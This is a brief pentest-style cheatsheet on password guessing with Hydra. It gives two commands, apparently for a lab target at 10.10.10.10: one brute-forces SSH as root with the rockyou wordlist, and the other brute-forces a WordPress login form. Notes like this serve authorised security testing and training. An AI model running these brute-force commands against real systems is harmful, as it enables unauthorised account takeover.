# Cheatsheet - Password Guessing
## Hydra
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 -t4 ssh

hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/blog/wp-login.php?:log=^USER^&pwd=^PASS^:Error"
```
